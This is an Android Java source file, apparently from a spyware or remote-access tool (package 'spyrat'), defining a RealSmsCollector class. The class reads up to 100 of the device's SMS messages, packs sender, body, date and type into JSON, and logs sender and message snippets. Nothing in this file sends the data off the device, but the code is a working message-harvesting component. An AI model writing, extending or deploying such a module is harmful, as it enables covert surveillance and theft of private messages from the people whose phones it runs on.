package com.spyrat.investigation;

import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import android.util.Log;
import org.json.JSONArray;
import org.json.JSONObject;

public class RealSmsCollector {
    private static final String TAG = "RealSmsCollector";
    private Context context;
    
    public RealSmsCollector(Context context) {
        this.context = context;
    }
    
    public JSONArray getSMSMessages() {
        JSONArray smsList = new JSONArray();
        Cursor cursor = null;
        
        try {
            Log.d(TAG, "📨 Collecting REAL SMS messages from device...");
            
            Uri uri = Uri.parse("content://sms");
            String[] projection = new String[]{
                "_id", "address", "body", "date", "type"
            };
            
            cursor = context.getContentResolver().query(uri, projection, null, null, "date DESC LIMIT 100");
            
            if (cursor != null && cursor.moveToFirst()) {
                int count = 0;
                do {
                    String address = cursor.getString(cursor.getColumnIndexOrThrow("address"));
                    String body = cursor.getString(cursor.getColumnIndexOrThrow("body"));
                    long date = cursor.getLong(cursor.getColumnIndexOrThrow("date"));
                    int type = cursor.getInt(cursor.getColumnIndexOrThrow("type"));
                    
                    // Only add real SMS data
                    if (address != null && body != null) {
                        JSONObject sms = new JSONObject();
                        sms.put("id", cursor.getString(cursor.getColumnIndexOrThrow("_id")));
                        sms.put("sender", address);
                        sms.put("message", body);
                        sms.put("timestamp", date);
                        sms.put("type", getSmsType(type));
                        sms.put("readable_date", new java.util.Date(date).toString());
                        
                        smsList.put(sms);
                        count++;
                        
                        if (count <= 5) {
                            Log.d(TAG, "📱 REAL SMS: " + address + " - " + body.substring(0, Math.min(30, body.length())));
                        }
                    }
                    
                } while (cursor.moveToNext());
                
                Log.d(TAG, "✅ Collected " + count + " REAL SMS messages from device");
            } else {
                Log.w(TAG, "📭 No REAL SMS messages found in device");
            }
            
        } catch (SecurityException e) {
            Log.e(TAG, "❌ SMS permission denied - NO SMS DATA COLLECTED: " + e.getMessage());
        } catch (Exception e) {
            Log.e(TAG, "❌ Error reading REAL SMS: " + e.getMessage());
        } finally {
            if (cursor != null) {
                cursor.close();
            }
        }
        
        return smsList;
    }
    
    private String getSmsType(int type) {
        switch (type) {
            case 1: return "incoming";
            case 2: return "outgoing";
            case 3: return "draft";
            default: return "unknown";
        }
    }
}
